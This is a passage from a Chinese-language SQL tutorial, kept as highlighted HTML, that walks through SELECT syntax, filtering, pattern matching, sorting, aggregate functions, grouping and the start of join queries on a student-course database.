keyword\">SELECT</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">ALL</span><span class=\"token operator\">|</span><span class=\"token keyword\">DISTINCT</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;</span>目标列表达式<span class=\"token operator\">></span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">,</span><span class=\"token operator\">&lt;</span>目标列表达式<span class=\"token operator\">></span><span class=\"token punctuation\">]</span>··· <span class=\"token keyword\">FROM</span> <span class=\"token operator\">&lt;</span>表名或者视图名<span class=\"token operator\">></span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">,</span><span class=\"token operator\">&lt;</span>表名或者视图名<span class=\"token operator\">></span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">|</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">&lt;</span><span class=\"token keyword\">SELECT</span> 语句<span class=\"token operator\">></span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">AS</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;</span>别名<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token keyword\">WHERE</span> <span class=\"token operator\">&lt;</span>条件表达式<span class=\"token operator\">></span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token keyword\">GROUP</span> <span class=\"token keyword\">BY</span> <span class=\"token operator\">&lt;</span>列名<span class=\"token number\">1</span><span class=\"token operator\">></span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">HAVING</span> <span class=\"token operator\">&lt;</span>条件表达式<span class=\"token operator\">></span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token keyword\">ORDER</span> <span class=\"token keyword\">BY</span> <span class=\"token operator\">&lt;</span>列名<span class=\"token number\">2</span><span class=\"token operator\">></span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">ASC</span><span class=\"token operator\">|</span><span class=\"token keyword\">DESC</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>整个 select 语句的含义是，根据 where 子句的条件表达式从 from 子句指定的基本表，视图或派生表中找出满足条件的元组，再按照 select 子句中的目标表达式选出元组中的属性值形成的结果表。</p>\n<p><code>ALL</code>  表示显示所有结果， <code>DISTINCT</code>  表示去除重复的属性， <code>group by</code>  子句，将结果按照 &lt;列名 1&gt; 来进行分组，该属性列值相等的元组为一个组通常会在每组中作用聚集函数。如果有 <code>having</code>  则需要满足指定的条件， <code>order by</code>  的作用是将查询的结果排序。</p>\n<p>我的数据库三个表：</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221201163315778.png\" alt=\"image-20221201163315778\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221201163333243.png\" alt=\"image-20221201163333243\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221201163346603.png\" alt=\"image-20221201163346603\" /></p>\n<p>查询方式，主要分为下面四种</p>\n<h3 id=\"单表查询\"><a class=\"anchor\" href=\"#单表查询\">#</a> 单表查询</h3>\n<p>查询仅涉及一个表，查询中常需要一些条件，下表中总结了常用的查询条件</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221201140948099.png\" alt=\"image-20221201140948099\" /></p>\n<ol>\n<li>\n<p>查询表中的若干列</p>\n<ul>\n<li>\n<p>类似投影</p>\n</li>\n<li>\n<p><code>查询全体学生的学号和姓名</code> （查询指定列）</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">select</span> Sno<span class=\"token punctuation\">,</span>Sname <span class=\"token keyword\">from</span> Student<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221201132002432.png\" alt=\"image-20221201132002432\" /></p>\n</li>\n<li>\n<p><code>查询全体学生的详细记录</code> （查询全部列）</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> Student<span class=\"token punctuation\">;</span><span class=\"token comment\">/* 这里的 * 代表查询所有 */</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221201132332402.png\" alt=\"image-20221201132332402\" /></p>\n</li>\n<li>\n<p><code>查询全体学生的姓名及出生年月</code> （查询经过计算的值）</p>\n<p>&lt;font color=&quot;red&quot;&gt;select 子句中的 &lt; 目标列表达式 &gt; 不仅可以是属性列，也可以是表达式，还可以是支付穿常量，函数等 &lt;/font&gt;</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">select</span> Sname<span class=\"token punctuation\">,</span><span class=\"token number\">2022</span><span class=\"token operator\">-</span>Sage <span class=\"token keyword\">from</span> Student<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221201132913026.png\" alt=\"image-20221201132913026\" /></p>\n</li>\n<li>\n<p>查询全体学生姓名，出生年月和所在院系，使用小写字母表示系名</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">select</span> Sname<span class=\"token punctuation\">,</span><span class=\"token string\">'出生年：'</span><span class=\"token punctuation\">,</span><span class=\"token number\">2022</span><span class=\"token operator\">-</span>Sage<span class=\"token punctuation\">,</span>LOWER<span class=\"token punctuation\">(</span>Sdept<span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> Student<span class=\"token punctuation\">;</span><span class=\"token comment\">/* 这里 LOWER 表示转化为小写，对应的有 UPPER 转化为大写 */</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221201134153565.png\" alt=\"image-20221201134153565\" /></p>\n<p>&lt;font color=blue&gt; 这里字符串用单引号包裹 &lt;/font&gt;</p>\n</li>\n<li>\n<p><code>对上一个例子的查询结果进行别名</code> <br />\n用 as 进行别名（&lt;font color=red&gt; 可以省略 &lt;/font&gt;）</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">select</span> Sname <span class=\"token keyword\">AS</span> NAME<span class=\"token punctuation\">,</span><span class=\"token string\">'出生年：'</span><span class=\"token punctuation\">,</span><span class=\"token number\">2022</span><span class=\"token operator\">-</span>Sage BIRTHDAY<span class=\"token punctuation\">,</span>UPPER<span class=\"token punctuation\">(</span>Sdept<span class=\"token punctuation\">)</span> DEPARTMENT <span class=\"token keyword\">from</span> Student<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221201135923229.png\" alt=\"image-20221201135923229\" /></p>\n</li>\n</ul>\n</li>\n<li>\n<p>选择表中的若干行（元组）</p>\n<ul>\n<li>\n<p>类似选择</p>\n</li>\n<li>\n<p><code>查询选修了课程的学生学号</code> （消除重复行）</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">select</span> <span class=\"token keyword\">DISTINCT</span> Sno <span class=\"token keyword\">from</span> SC<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221201140711800.png\" alt=\"image-20221201140711800\" /></p>\n</li>\n<li>\n<p>接下来通过 where 子句使用查询条件进行查询</p>\n<ol>\n<li>\n<p>比较大小</p>\n<ul>\n<li>\n<p><code>查询计算机科学系全体学生的姓名</code></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">select</span> Sname <span class=\"token keyword\">from</span> Student <span class=\"token keyword\">where</span> Sdept<span class=\"token operator\">=</span><span class=\"token string\">'CS'</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221201142040007.png\" alt=\"image-20221201142040007\" /></p>\n</li>\n<li>\n<p><code>查询所有年龄在20岁一下的学生姓名及其年龄</code></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">select</span> Sname<span class=\"token punctuation\">,</span>Sage <span class=\"token keyword\">from</span> Student <span class=\"token keyword\">where</span> Sage<span class=\"token operator\">!</span><span class=\"token operator\">></span><span class=\"token number\">20</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221201142007098.png\" alt=\"image-20221201142007098\" /></p>\n</li>\n<li>\n<p><code>查询考试成绩没有90的学生学号</code></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">select</span> <span class=\"token keyword\">DISTINCT</span> Sno <span class=\"token keyword\">from</span> SC <span class=\"token keyword\">where</span> Grade<span class=\"token operator\">&lt;=</span><span class=\"token number\">90</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221201142333099.png\" alt=\"image-20221201142333099\" /></p>\n</li>\n</ul>\n</li>\n<li>\n<p>确定范围</p>\n<p>使用谓词 BETWEEN ....AND... 确定范围</p>\n<ul>\n<li>\n<p>查询年龄在 20~23 岁，包括 20 和 23 岁之间的学生的姓名系别和年龄</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">select</span> Sname<span class=\"token punctuation\">,</span>Sdept<span class=\"token punctuation\">,</span>Sage <span class=\"token keyword\">from</span> Student <span class=\"token keyword\">where</span> Sage <span class=\"token operator\">between</span> <span class=\"token number\">20</span> <span class=\"token operator\">and</span> <span class=\"token number\">23</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221201142947029.png\" alt=\"image-20221201142947029\" /></p>\n</li>\n<li>\n<p>查询年龄不在 20~23 岁，之间的学生的姓名系别和年龄</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">select</span> Sname<span class=\"token punctuation\">,</span>Sdept<span class=\"token punctuation\">,</span>Sage <span class=\"token keyword\">from</span> Student <span class=\"token keyword\">where</span> Sage <span class=\"token operator\">not</span> <span class=\"token operator\">between</span> <span class=\"token number\">20</span> <span class=\"token operator\">and</span> <span class=\"token number\">23</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221201143028072.png\" alt=\"image-20221201143028072\" /></p>\n</li>\n</ul>\n</li>\n<li>\n<p>确定集合</p>\n<p>使用谓词 IN 来查找属性值属于指定集合的元组</p>\n<ul>\n<li>\n<p><code>查询信息系（IS）、数学系（MA）和计算机科学性（CS）学生的姓名和性别。</code></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">select</span> Sname<span class=\"token punctuation\">,</span>Ssex <span class=\"token keyword\">from</span> Student <span class=\"token keyword\">where</span> Sdept <span class=\"token operator\">IN</span><span class=\"token punctuation\">(</span><span class=\"token string\">'IS'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'MA'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'CS'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221201143628640.png\" alt=\"image-20221201143628640\" /></p>\n</li>\n<li>\n<p><code>查询即不是信息系，数学系，也不是计算机科学系的学生的姓名和性别</code></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">select</span> Sname<span class=\"token punctuation\">,</span>Ssex <span class=\"token keyword\">from</span> Student <span class=\"token keyword\">where</span> Sdept <span class=\"token operator\">not</span> <span class=\"token operator\">IN</span><span class=\"token punctuation\">(</span><span class=\"token string\">'IS'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'MA'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'CS'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221201143815063.png\" alt=\"image-20221201143815063\" /></p>\n</li>\n</ul>\n</li>\n<li>\n<p>字符匹配</p>\n<p>使用谓词 like 来进行字符串匹配</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token operator\">NOT</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">LIKE</span> <span class=\"token string\">'&lt;匹配串>'</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">ESCAPE</span> <span class=\"token string\">'&lt;换码字符>'</span><span class=\"token punctuation\">]</span><span class=\"token comment\">/* 用 % 匹配任意字符，用_匹配任意单个字符 */</span></pre></td></tr></table></figure><ul>\n<li>\n<p><code>查询学号为201215121的学生的详细情况</code> （字符串为固定字符）</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">FROM</span> Student <span class=\"token keyword\">where</span> Sno <span class=\"token operator\">LIKE</span> <span class=\"token string\">'201215121'</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221201162259416.png\" alt=\"image-20221201162259416\" /></p>\n</li>\n<li>\n<p><code>查询所有刘姓学生的姓名，学号，性别</code> （匹配串为含通配符的字符串）</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">select</span> Sname<span class=\"token punctuation\">,</span>Sno<span class=\"token punctuation\">,</span>Ssex <span class=\"token keyword\">FROM</span> Student <span class=\"token keyword\">where</span> Sname <span class=\"token operator\">LIKE</span> <span class=\"token string\">'刘%'</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221201162905296.png\" alt=\"image-20221201162905296\" /></p>\n<p><code>查询姓”欧阳“，且全名为三个汉字的学生的姓名</code></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">select</span> Sname <span class=\"token keyword\">FROM</span> Student <span class=\"token keyword\">where</span> Sname <span class=\"token operator\">LIKE</span> <span class=\"token string\">'欧阳_'</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221201163127358.png\" alt=\"image-20221201163127358\" /></p>\n</li>\n<li>\n<p><code>查询以“DB_”开头，且倒数第三个字符为i的课程的详细情况</code> （特殊字符转义）</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">FROM</span> Course <span class=\"token keyword\">where</span> Cname <span class=\"token operator\">LIKE</span> <span class=\"token string\">'DB\\_%i__'</span> <span class=\"token keyword\">ESCAPE</span> <span class=\"token string\">'\\'; /*escape表示'</span>\\'为转义字符<span class=\"token operator\">*</span><span class=\"token operator\">/</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221201164143639.png\" alt=\"image-20221201164143639\" /></p>\n</li>\n</ul>\n</li>\n<li>\n<p>涉及空值的查询</p>\n<ul>\n<li>\n<p><code>某些学生选修课程后没有参加考试，所以有选课记录，但是没有成绩，查询缺少成绩的学生的学号和相应的课程号</code></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">select</span> Sno<span class=\"token punctuation\">,</span>Cno <span class=\"token keyword\">FROM</span> SC <span class=\"token keyword\">where</span> Grade <span class=\"token operator\">is</span> <span class=\"token boolean\">NULL</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221201164934434.png\" alt=\"image-20221201164934434\" /></p>\n</li>\n<li>\n<p><code>查询所有有成绩的学生信息</code></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">select</span> Sno<span class=\"token punctuation\">,</span>Cno <span class=\"token keyword\">FROM</span> SC <span class=\"token keyword\">where</span> Grade <span class=\"token operator\">is</span> <span class=\"token operator\">NOT</span> <span class=\"token boolean\">NULL</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221201165045093.png\" alt=\"image-20221201165045093\" /></p>\n</li>\n</ul>\n</li>\n<li>\n<p>多重条件查询</p>\n<p>使用 and，or 来连接条件，and 的优先级高于 or</p>\n<ul>\n<li>\n<p><code>查询计算机系年龄在20岁一下的学生姓名</code></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">select</span> Sname <span class=\"token keyword\">FROM</span> Student <span class=\"token keyword\">where</span> Sage<span class=\"token operator\">&lt;=</span><span class=\"token number\">20</span> <span class=\"token operator\">and</span> Sdept<span class=\"token operator\">=</span><span class=\"token string\">'CS'</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221201172127267.png\" alt=\"image-20221201172127267\" /></p>\n</li>\n</ul>\n</li>\n</ol>\n</li>\n</ul>\n</li>\n<li>\n<p>order by 子句</p>\n<ul>\n<li>\n<p>对选择结果排序</p>\n</li>\n<li>\n<p><code>查询选修了2号课程的学生的学号及成绩，查询结果按照分数的降序排列</code></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">select</span> Sno<span class=\"token punctuation\">,</span>Grade <span class=\"token keyword\">FROM</span> SC <span class=\"token keyword\">where</span> Cno<span class=\"token operator\">=</span><span class=\"token string\">'2'</span> <span class=\"token keyword\">Order</span> <span class=\"token keyword\">BY</span> Grade <span class=\"token keyword\">DESC</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221201222545664.png\" alt=\"image-20221201222545664\" /></p>\n</li>\n<li>\n<p><code>查询全体学生情况，查询结果按所在系的系名降序排列，同一系中的学生按年龄的升序排列</code></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> Student <span class=\"token keyword\">ORDER</span> <span class=\"token keyword\">BY</span> Sdept <span class=\"token keyword\">DESC</span><span class=\"token punctuation\">,</span>Sage<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221201223148145.png\" alt=\"image-20221201223148145\" /></p>\n</li>\n</ul>\n</li>\n<li>\n<p>使用集合函数</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">COUNT</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>\t\t\t\t\t统计元组个数</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">COUNT</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token keyword\">DISTINCT</span><span class=\"token operator\">|</span><span class=\"token keyword\">ALL</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;</span>列名<span class=\"token operator\">></span><span class=\"token punctuation\">)</span> \t统计一列中值的个数</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">SUM</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token keyword\">DISTINCT</span><span class=\"token operator\">|</span><span class=\"token keyword\">ALL</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;</span>列名<span class=\"token operator\">></span><span class=\"token punctuation\">)</span>\t统计一列值的总和（此列必须是数值型）</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">AVG</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token keyword\">DISTINCT</span><span class=\"token operator\">|</span><span class=\"token keyword\">ALL</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;</span>列名<span class=\"token operator\">></span><span class=\"token punctuation\">)</span>\t计算一列值的平均值（此列必须是整数型）</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token function\">MAX</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token keyword\">DISTINCT</span><span class=\"token operator\">|</span><span class=\"token keyword\">ALL</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;</span>列名<span class=\"token operator\">></span><span class=\"token punctuation\">)</span>\t求一列中的最大值</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token function\">MIN</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token keyword\">DISTINCT</span><span class=\"token operator\">|</span><span class=\"token keyword\">ALL</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;</span>列名<span class=\"token operator\">></span><span class=\"token punctuation\">)</span>\t求一列中的最小值</pre></td></tr></table></figure><ul>\n<li>\n<p>又称级函数，或者聚集函数，或组函数</p>\n</li>\n<li>\n<p><code>查询学生的总人数</code></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">select</span> <span class=\"token function\">COUNT</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> Student<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221201223742434.png\" alt=\"image-20221201223742434\" /></p>\n</li>\n<li>\n<p><code>查询选修了课程的学生人数</code></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">select</span> <span class=\"token function\">COUNT</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">DISTINCT</span> Sno<span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> SC<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221201224035853.png\" alt=\"image-20221201224035853\" /></p>\n</li>\n<li>\n<p><code>计算2号课程的学生的平均成绩</code></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">select</span> <span class=\"token function\">AVG</span><span class=\"token punctuation\">(</span>Grade<span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> SC <span class=\"token keyword\">WHERE</span> Cno<span class=\"token operator\">=</span><span class=\"token string\">'2'</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221201225221482.png\" alt=\"image-20221201225221482\" /></p>\n</li>\n</ul>\n</li>\n<li>\n<p>分组（group by 子句）</p>\n<ul>\n<li>\n<p>对查询结果分组，将查询的结果再次分组</p>\n</li>\n<li>\n<p><code>求各个课程号及其对应的人数</code></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">select</span> Cno<span class=\"token punctuation\">,</span><span class=\"token function\">COUNT</span><span class=\"token punctuation\">(</span>Sno<span class=\"token punctuation\">)</span> <span class=\"token keyword\">FROM</span> SC <span class=\"token keyword\">GROUP</span> <span class=\"token keyword\">BY</span> Cno<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221201231512674.png\" alt=\"image-20221201231512674\" /></p>\n</li>\n<li>\n<p><code>查询选修了一门以上的课程的学生的学号</code></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">SELECT</span> Sno <span class=\"token keyword\">from</span> SC <span class=\"token keyword\">GROUP</span> <span class=\"token keyword\">BY</span> Sno <span class=\"token keyword\">HAVING</span> <span class=\"token function\">COUNT</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221201231859584.png\" alt=\"image-20221201231859584\" /></p>\n</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"连接查询\"><a class=\"anchor\" href=\"#连接查询\">#</a> 连接查询</h3>\n<p>前面的都只在一个表中进行查询，而连接查询同时涉及 &lt;font color=red&gt; 多个表 &lt;/font&gt;</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>表名<span class=\"token number\">1</span><span class=\"token operator\">></span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span>列名<span class=\"token number\">1</span><span class=\"token operator\">></span> <span class=\"token operator\">&lt;</span>比较运算符<span class=\"token operator\">></span> <span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>表名<span class=\"token number\">2</span><span class=\"token operator\">></span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span>列名<span class=\"token number\">2</span><span class=\"token operator\">></span><span class=\"token punctuation\">;</span><span class=\"token comment\">#常见的比较运算符主要 =,>,&lt;,>=,&lt;=,&lt;>,!=,!>,!&lt;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>表名<span class=\"token number\">1</span><span class=\"token operator\">></span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span>列名<span class=\"token number\">1</span><span class=\"token operator\">></span> <span class=\"token operator\">BETWEEN</span> <span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>表名<span class=\"token number\">2</span><span class=\"token operator\">></span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span>列名<span class=\"token number\">2</span><span class=\"token operator\">></span> <span class=\"token operator\">AND</span> <span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>表名<span class=\"token number\">3</span><span class=\"token operator\">></span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span>列名<span class=\"token number\">3</span><span class=\"token operator\">></span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>&lt;font color=red&gt; 比较的两个条件名字可以不同，但是数据类型要是相同的 &lt;/font&gt;</p>\n<ol>\n<li>\n<p>等值与非等值连接查询</p>\n<ul>\n<li>\n<p>等值连接</p>\n<p>连接运算符为 =</p>\n<ul>\n<li>\n<p><code>查询每个学生及其选修课程的情况</code></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">select</span> Student<span class=\"token punctuation\">.</span><span class=\"token operator\">*</span><span class=\"token punctuation\">,</span>SC<span class=\"token punctuation\">.</span><span class=\"token operator\">*</span> <span class=\"token keyword\">FROM</span> Student<span class=\"token punctuation\">,</span>SC <span class=\"token keyword\">where</span> Student<span class=\"token punctuation\">.</span>Sno<span class=\"token operator\">=</span>SC<span class=\"token 